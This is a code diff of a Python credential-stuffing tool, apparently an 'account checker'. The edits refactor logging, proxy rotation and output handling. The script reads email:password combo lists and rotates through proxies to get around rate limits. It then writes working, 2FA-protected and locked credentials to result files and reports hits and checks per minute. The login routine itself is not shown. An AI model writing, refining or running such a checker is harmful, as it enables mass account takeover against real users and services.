@@ -4,8 +4,8 @@ import queue
 import threading
 import time
 import configparser
+
 import requests
-from datetime import datetime
 
 requests.packages.urllib3.disable_warnings()
 
@@ -34,8 +34,9 @@ C = {
 
 output_lock = threading.Lock()
 
+
 def log(tag, line):
-    ts = datetime.now().strftime('%H:%M:%S')
+    ts = time.strftime('%H:%M:%S')
     col = C.get(tag, C['white'])
     labels = {
         'hit':   '[ HIT ]',
@@ -52,10 +53,12 @@ def log(tag, line):
         sys.stdout.write('\r\033[K' + msg + '\n')
         sys.stdout.flush()
 
+
 def load_config():
     cfg = configparser.ConfigParser()
     cfg.read('config.ini')
     return cfg
+
 
 def cfg_bool(cfg, section, key, fallback=False):
     try:
@@ -63,11 +66,13 @@ def cfg_bool(cfg, section, key, fallback=False):
     except Exception:
         return fallback
 
+
 def cfg_str(cfg, section, key, fallback=''):
     try:
         return cfg.get(section, key, fallback=fallback)
     except Exception:
         return fallback
+
 
 def build_checker_cfg(cfg):
     return {
@@ -88,6 +93,7 @@ def build_checker_cfg(cfg):
         'save_bad':             cfg_bool(cfg, 'Output', 'save_bad', False),
     }
 
+
 def check_account(combo, proxy_list, result_dir, checker_cfg):
     if ':' not in combo:
         return
@@ -98,9 +104,9 @@ def check_account(combo, proxy_list, result_dir, checker_cfg):
     sess = get_session()
     proxy_str = None
     if proxy_list:
-        import random
-        proxy_str = random.choice(proxy_list)
-        sess.proxies = {'http': proxy_str, 'https': proxy_str}
+        proxy_str = get_next_proxy()
+        if proxy_str:
+            sess.proxies = {'http': proxy_str, 'https': proxy_str}
 
     wait_if_needed()
 
@@ -112,6 +118,7 @@ def check_account(combo, proxy_list, result_dir, checker_cfg):
         log('err', f'{email} | {str(e)[:60]}')
         if proxy_str:
             mark_proxy_failed(proxy_str)
+        update_title()
         return
 
     increment_stat('checked')
@@ -123,18 +130,21 @@ def check_account(combo, proxy_list, result_dir, checker_cfg):
         if checker_cfg.get('save_bad'):
             write_with_dedup(os.path.join(result_dir, 'BAD.txt'), f'{email}:{password}')
         log('bad', f'{email}:{password}')
+        update_title()
         return
 
     if status == '2FA':
         increment_stat('two_factor')
         write_with_dedup(os.path.join(result_dir, '2FA.txt'), f'{email}:{password}')
         log('tfa', f'{email}:{password}')
+        update_title()
         return
 
     if status == 'LOCKED':
         increment_stat('errors')
         write_with_dedup(os.path.join(result_dir, 'Locked.txt'), f'{email}:{password}')
         log('lock', f'{email}:{password}')
+        update_title()
         return
 
     if status == 'ERROR':
@@ -142,6 +152,7 @@ def check_account(combo, proxy_list, result_dir, checker_cfg):
         log('err', f'{email}:{password}')
         if proxy_str:
             mark_proxy_failed(proxy_str)
+        update_title()
         return
 
     if determine_value(cap):
@@ -158,6 +169,7 @@ def check_account(combo, proxy_list, result_dir, checker_cfg):
 
     update_title()
 
+
 def worker(q, proxy_list, result_dir, checker_cfg):
     while True:
         try:
@@ -169,6 +181,7 @@ def worker(q, proxy_list, result_dir, checker_cfg):
         except Exception:
             pass
         q.task_done()
+
 
 def main():
     cfg = load_config()
@@ -198,9 +211,6 @@ def main():
         return
 
     result_dir = get_result_directory()
-
-    for sub in ('Countries', 'Games', 'Inboxes'):
-        os.makedirs(os.path.join(result_dir, sub), exist_ok=True)
 
     from core.stats_collector import get_novastatscollector
     col = get_novastatscollector()
@@ -232,6 +242,7 @@ def main():
         f"  {C['white']}Hits:{s.get('hits',0)} | Bad:{s.get('bad',0)} | 2FA:{s.get('two_factor',0)} | "
         f"NoVal:{s.get('noval',0)} | Errors:{s.get('errors',0)} | CPM:{cpm}{C['rst']}\n"
     )
+
 
 if __name__ == '__main__':
     main()
